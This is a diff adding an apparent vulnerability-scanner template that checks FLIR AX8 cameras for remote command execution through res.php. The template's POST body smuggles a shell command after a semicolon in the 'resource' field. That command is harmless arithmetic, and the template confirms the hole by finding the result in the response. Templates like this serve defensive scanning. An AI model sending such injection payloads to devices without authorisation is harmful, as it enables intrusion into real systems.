@@ -1,0 +1,31 @@
+id: flir-ax8-res-rce
+info:
+  name: FLIR-AX8 res.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+variables:
+  t1: "{{rand_int(111000, 999000)}}"
+  t2: "{{rand_int(10, 100)}}"
+  t3: "{{to_number(t1) - to_number(t2)}}"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/res.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=node&resource=1;expr {{t1}} - {{t2}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t3}}"
+        part: body
+      - type: word
+        words:
+          - "bad data"
+        part: body
